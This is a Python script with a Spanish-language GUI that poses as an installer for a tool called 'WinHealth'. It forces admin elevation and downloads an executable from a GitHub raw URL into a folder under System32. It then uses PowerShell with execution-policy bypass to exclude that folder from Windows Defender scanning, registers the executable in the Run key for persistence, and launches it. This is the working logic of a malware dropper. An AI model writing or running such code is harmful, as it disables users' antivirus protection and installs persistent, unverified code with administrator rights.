#!/usr/bin/env python3
import os
import sys
import ctypes
import subprocess
import urllib.request
from urllib.error import HTTPError
import winreg
import shutil
import threading
import time
import tkinter as tk
from tkinter import ttk, messagebox

# --- Configuration ---
WINHEALTH_FOLDER = r"C:\Windows\System32\WinHealth"
TARGET_FILENAME = "winhealth.exe"
TARGET_PATH = os.path.join(WINHEALTH_FOLDER, TARGET_FILENAME)
RAW_URL = "https://github.com/enderhacker/winhealth/raw/main/winhealth.exe"


# --- Admin check ---
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def relaunch_as_admin_and_exit():
    python_exe = sys.executable
    # If running from PyInstaller, the exe is sys.executable
    # Pass current script with quotes
    script_path = f'"{python_executable()}"'  # function below
    params = f'"{script_path}"'
    # Add any other args if needed
    try:
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", python_exe, params, None, 1
        )
        if ret <= 32:
            messagebox.showerror("Error", "No se pudo ejecutar como administrador.")
            sys.exit(1)
    except Exception as e:
        messagebox.showerror("Error", f"Fallo al intentar elevar privilegios:\n{e}")
        sys.exit(1)
    sys.exit(0)


def python_executable():
    """Return the correct path to the running script/exe."""
    if getattr(sys, "frozen", False):  # PyInstaller exe
        return sys.executable
    else:
        return os.path.abspath(__file__)


# --- Core functions ---
def kill_process(process_name="winhealth.exe"):
    try:
        subprocess.run(
            ["taskkill", "/f", "/im", process_name],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    except Exception:
        pass


def uninstall_old():
    kill_process("winhealth.exe")
    if os.path.isfile(TARGET_PATH):
        try:
            os.remove(TARGET_PATH)
        except Exception:
            pass
    if os.path.isdir(WINHEALTH_FOLDER):
        try:
            shutil.rmtree(WINHEALTH_FOLDER, ignore_errors=True)
        except Exception:
            pass
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        try:
            winreg.DeleteValue(key, "WinHealth")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass
    return True


def ensure_folder():
    try:
        if os.path.exists(WINHEALTH_FOLDER):
            shutil.rmtree(WINHEALTH_FOLDER, ignore_errors=True)
        os.makedirs(WINHEALTH_FOLDER, exist_ok=True)
        return True
    except Exception:
        return False


def download_file(url, dest_path):
    try:
        with urllib.request.urlopen(url) as resp:
            if resp.status != 200:
                raise HTTPError(url, resp.status, resp.reason, resp.headers, None)
            with open(dest_path, "wb") as out:
                while chunk := resp.read(8192):
                    out.write(chunk)
        return True
    except Exception:
        return False


def add_defender_exclusion(folder):
    ps_cmd = f'Add-MpPreference -ExclusionPath "{folder}"'
    try:
        subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                ps_cmd,
            ],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        return True
    except Exception:
        return False


def add_to_startup(exe_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "WinHealth", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def start_file(folder, filename):
    try:
        file_path = os.path.join(folder, filename)
        subprocess.Popen([file_path], shell=True)
        return True
    except Exception:
        return False


# --- Tkinter Installer ---
class InstallerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("WinHealth Installer")
        self.root.geometry("450x150")
        self.root.resizable(False, False)

        # Initial question
        self.label = tk.Label(
            root, text="¿Quieres instalar WinHealth?", font=("Segoe UI", 12)
        )
        self.label.pack(pady=20)

        # Progress bar and status
        self.progress = ttk.Progressbar(root, length=350, mode="determinate")
        self.status = tk.Label(root, text="", font=("Segoe UI", 10))

        # Final message
        self.final_label = tk.Label(root, text="", font=("Segoe UI", 12))

        # Buttons
        self.btn_frame = tk.Frame(root)
        self.btn_frame.pack(pady=15)

        self.yes_btn = tk.Button(
            self.btn_frame, text="Instalar", width=12, command=self.start_install_thread
        )
        self.yes_btn.grid(row=0, column=0, padx=10)
        self.no_btn = tk.Button(
            self.btn_frame, text="Cancelar", width=12, command=root.quit
        )
        self.no_btn.grid(row=0, column=1, padx=10)

    def update_status(self, text, step=None):
        self.status.config(text=text)
        if step is not None:
            self.progress["value"] = step
        self.root.update_idletasks()

    def start_install_thread(self):
        self.label.pack_forget()
        self.btn_frame.pack_forget()
        self.progress.pack(pady=10)
        self.status.pack(pady=5)
        threading.Thread(target=self.start_install, daemon=True).start()

    def start_install(self):
        steps = [
            ("Desinstalando versiones antiguas...", uninstall_old),
            ("Creando carpeta...", ensure_folder),
            ("Descargando ejecutable...", lambda: download_file(RAW_URL, TARGET_PATH)),
            (
                "Agregando a exclusiones de Defender...",
                lambda: add_defender_exclusion(WINHEALTH_FOLDER),
            ),
            ("Agregando al inicio de Windows...", lambda: add_to_startup(TARGET_PATH)),
            (
                "Iniciando aplicación...",
                lambda: start_file(WINHEALTH_FOLDER, TARGET_FILENAME),
            ),
        ]

        self.progress["maximum"] = len(steps)

        for i, (msg, func) in enumerate(steps, start=1):
            start_time = time.time()
            self.update_status(msg, i - 1)
            ok = func()
            elapsed = time.time() - start_time

            # Ensure each step takes at least 0.2 seconds
            if elapsed < 0.2:
                time.sleep(0.2 - elapsed)

            if not ok:
                messagebox.showerror("Error", f"Ocurrió un error en: {msg}")
                self.show_close_button()
                return

            self.update_status(f"{msg} OK", i)

        # Finished
        self.progress.pack_forget()
        self.status.pack_forget()
        self.final_label.config(text="WinHealth se instaló correctamente")
        self.final_label.pack(pady=40)
        self.show_close_button()

    def show_close_button(self):
        close_frame = tk.Frame(self.root)
        close_frame.pack(pady=10)
        close_btn = tk.Button(
            close_frame, text="Cerrar", width=12, command=self.root.quit
        )
        close_btn.pack()


# --- Main ---
def main():
    if not is_admin():
        relaunch_as_admin_and_exit()

    root = tk.Tk()
    app = InstallerApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
